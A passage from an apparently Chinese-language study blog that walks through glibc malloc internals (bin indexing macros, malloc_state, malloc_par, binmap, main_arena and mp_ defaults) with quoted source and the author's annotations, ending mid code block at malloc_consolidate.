<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></td></tr></table></figure>

<ul>
<li>从fastbin_index方法也可以看出fastbin是将<strong>chunk大小</strong>转换为<strong>数据空间大小</strong>来index的, 从最短的8字节到80字节(默认64字节), 实际上支持(80 * SIZE_SZ / 4)字节</li>
</ul>
<p><strong>数量和容量</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-comment">//	    DEFAULT_MXFAST     64 (for 32bit), 128 (for 64bit)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                                                      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></td></tr></table></figure>

<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="hljs-comment">//可能32为8, 64为16??</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ) <span class="hljs-comment">//暂时不知道这是做啥的, 一般为0</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) <span class="hljs-comment">//32:512  64:1024</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p>可以看到MIN_LARGE_SIZE用作了判断块大小是否位于small bin的范围内</p>
</li>
<li><p>small bin 紧跟在unsorted bin之后, 索引从2-??(自己想去), 所以index只需要移位就可以了, 相邻下标之间间隔0x10(64), 0x8(32)</p>
</li>
<li><p><strong>small bin和fast bin有一部分范围是重合的</strong> </p>
</li>
<li><p><strong>FIFO 链头插链尾入</strong> </p>
</li>
<li><p>small bin结构: 双向链表</p>
<p>待补充, 之前想错了</p>
</li>
</ul>
<h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p>fd_nextsize和bk_nextsize只适用于large bins, 且pointer to next larger size.</p>
</li>
<li><p><strong>从链头(bin处) 到 链尾，沿着各个chunk的fd指针，chunks大小从高到低，依次排序</strong> </p>
<ul>
<li><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p>
</li>
<li><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p>
</li>
<li><p>large bin结构:</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/08/10/KHlB5YwzDnq1pmZ.png" srcset="/img/loading.gif" lazyload alt="large-bin"> </p>
</li>
</ul>
<h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br></code></pre></td></tr></table></figure>

<h3 id="总的index"><a href="#总的index" class="headerlink" title="总的index"></a>总的index</h3><pre><code class=" mermaid">graph LR
g([bin_index])--&gt;a(smallbin_index) &amp; b(largebin_index)
b--&gt;|64|largebin_index_64
b--&gt;|32 &amp; MALLOC_ALIGNMENT == 16|m[largebin_index_32_big]
b--&gt;|32 &amp; != 16|largebin_index_32
</code></pre>

<h2 id="核心结构体"><a href="#核心结构体" class="headerlink" title="核心结构体"></a>核心结构体</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-keyword">int</span> flags;<br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-keyword">int</span> have_fastchunks;   <span class="hljs-comment">//have_fastchunks是glibc 2.27 及以后特有的, 四字节32位可用</span><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><strong>flags</strong> ****</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></td></tr></table></figure>

<p><strong>Binmap</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Binmap</span><br><span class="hljs-comment">    To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span><br><span class="hljs-comment">    bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment">    be skipped over during during traversals.  The bits are NOT always</span><br><span class="hljs-comment">    cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment">    when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="hljs-comment">//32 bits per map word,every bit is useful</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)<span class="hljs-comment">//第6位及以后确定block</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))<span class="hljs-comment">//i &amp; 31:取出低5位决定在block中的bit</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></td></tr></table></figure>

<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> //<span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span>, 堆管理器的相关参数</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-keyword">int</span> n_mmaps;<br>  <span class="hljs-keyword">int</span> n_mmaps_max;<br>  <span class="hljs-keyword">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-keyword">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-keyword">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_bins;<br>  <span class="hljs-keyword">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li>当每个分配区的 top chunk 大小大于<strong>trim_threshold</strong>时，在一定的条件下，调用 free 时会收缩内存，减小 top chunk 的大小。</li>
<li><strong>top_pad</strong> 字段表示在分配内存时是否添加额外的 pad，默认该字段为 0。 </li>
<li><strong>mmap_threshold</strong> 字段表示 mmap 分配阈值，默认值为 128KB，在 32 位系统上最大值为 512KB，64 位系统上的最大值为 32MB，由于默认开启 mmap 分配阈值动态调整，该字段的 值会动态修改，但不会超过最大值。 </li>
<li><strong>arena_test</strong> 和 <strong>arena_max</strong> 用于 PER_THREAD 优化，在 32 位系统上 arena_test 默认值为 2， 64 位系统上的默认值为 8，当每个进程的分配区数量小于等于 arena_test 时，不会重用已有 的分配区。为了限制分配区的总数，用 arena_max 来保存分配区的最大数量，当系统中的分 配区数量达到 arena_max，就不会再创建新的分配区，只会重用已有的分配区。这两个字段 都可以使用 mallopt()函数设置。 </li>
<li><strong>n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的个数。 </li>
<li><strong>n_mmaps_max</strong> 字段表示进程使用 mmap()函数分配的内存块的最大数量，默认值为65536，可以使用 mallopt()函数修改</li>
<li><strong>max_n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的数量的最大值，有关系 n_mmaps &lt;= max_n_mmaps 成立。这个字段是由于 mstats()函数输出统计需要这个字段。 </li>
<li><strong>no_dyn_threshold</strong> 字段表示是否开启 mmap 分配阈值动态调整机制，默认值为 0，也就 是默认开启 mmap 分配阈值动态调整机制。 </li>
<li><strong>pagesize</strong> 字段表示系统的页大小，默认为 4KB。 </li>
<li><strong>mmapped_mem</strong> 和 <strong>max_mmapped_mem</strong> 都用于统计 mmap 分配的内存大小，一般情况 下两个字段的值相等，max_mmapped_mem 用于 mstats()函数。 </li>
<li><strong>max_total_mem</strong> 字段在单线程情况下用于统计进程分配的内存总数。 </li>
<li><strong>sbrk_base</strong> 字段表示堆的起始地址。</li>
</ul>
<h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span> <span class="hljs-comment">//main_arena是一个里libc中的全局静态变量</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li>设置了<code>top_pad</code>为 0</li>
<li>设置了<code>n_maps_max</code>为 65535</li>
<li>设置了<code>mmap_threshold</code>为 128 * 1024</li>
<li>设置了<code>trim_threshold</code>为 128 * 1024</li>
<li>设置了<code>arena_test</code>在gcc中32下为2，64位下为8（不同的编译器中long的长度可能不同，这里仅以gcc为例）</li>
</ul>
<h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><span id="malloc_consolidate"><strong>malloc_consolidate</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 